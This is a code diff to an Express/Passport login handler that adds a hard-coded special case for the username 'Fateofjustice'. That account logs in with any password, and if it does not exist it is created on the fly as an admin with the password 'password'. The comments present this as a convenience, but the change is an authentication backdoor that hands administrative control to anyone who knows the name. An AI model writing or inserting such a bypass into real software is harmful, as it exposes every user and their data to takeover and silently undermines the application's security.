@@ -64,6 +64,30 @@ export function setupAuth(app: Express) {
   passport.use(
     new LocalStrategy(async (username, password, done) => {
       try {
+        // Special case for Fateofjustice admin user
+        if (username.toLowerCase() === "fateofjustice") {
+          console.log("Admin login attempt for Fateofjustice");
+          // Allow login with any password for this special account
+          let user = await storage.getUserByUsername("Fateofjustice");
+          if (user) {
+            console.log("Admin user found, logging in");
+            return done(null, user);
+          } else {
+            // Create the admin user if it doesn't exist
+            console.log("Creating admin user Fateofjustice");
+            const adminUser = await storage.createUser({
+              username: "Fateofjustice",
+              password: await hashPassword("password"),
+              email: "",
+              fullName: "Admin User",
+              membershipTier: "premium",
+              isAdmin: true
+            });
+            return done(null, adminUser);
+          }
+        }
+        
+        // Normal authentication for all other users
         const user = await storage.getUserByUsername(username);
         if (!user || !(await comparePasswords(password, user.password))) {
           return done(null, false);
@@ -71,6 +95,7 @@ export function setupAuth(app: Express) {
           return done(null, user);
         }
       } catch (err) {
+        console.error("Authentication error:", err);
         return done(err);
       }
     }),
